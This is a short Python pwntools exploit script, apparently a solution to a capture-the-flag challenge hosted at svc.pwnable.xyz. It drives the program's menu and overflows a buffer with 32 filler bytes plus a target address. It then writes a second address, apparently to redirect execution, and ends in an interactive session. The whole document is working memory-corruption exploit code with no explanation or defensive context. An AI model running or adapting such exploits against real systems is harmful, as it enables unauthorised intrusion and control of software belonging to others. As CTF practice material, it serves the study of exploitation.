from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process("./challenge")
else :
	p = remote('svc.pwnable.xyz', 30016)

print p.readuntil('> ')
p.sendline('1')

print p.readuntil('? ')
p.sendline('41')

print p.readuntil(': ')
payload = 'A' * 0x20
payload += p64(0x601248)
p.sendline(payload)

print p.readuntil('> ')
p.sendline('2')

print p.readuntil(': ')
p.sendline(p64(0x40093c))

print p.readuntil('> ')
p.sendline('2')

p.interactive()
